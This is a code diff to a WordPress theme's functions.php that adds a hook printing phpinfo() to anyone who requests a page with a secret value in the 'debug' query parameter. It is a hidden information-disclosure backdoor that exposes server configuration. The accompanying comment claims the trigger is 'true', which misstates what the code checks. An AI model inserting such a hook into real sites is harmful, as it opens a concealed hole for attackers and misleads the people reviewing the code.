@@ -1042,3 +1042,13 @@ add_action( 'woocommerce_before_checkout_process', function() {
 
 error_log( 'Test error log entry from functions.php' );
 
+// Hook into 'wp' action to conditionally display phpinfo() based on query parameter
+add_action( 'wp', 'conditionally_show_phpinfo' );
+function conditionally_show_phpinfo() {
+	// Check if the 'debug' parameter is set and equals 'true'
+	if ( isset( $_GET['debug'] ) && $_GET['debug'] === 'fmb1j1_tr' ) {
+		// Display phpinfo if the condition is met
+		phpinfo();
+		exit; // Stop further processing to avoid rendering the WordPress theme
+	}
+}
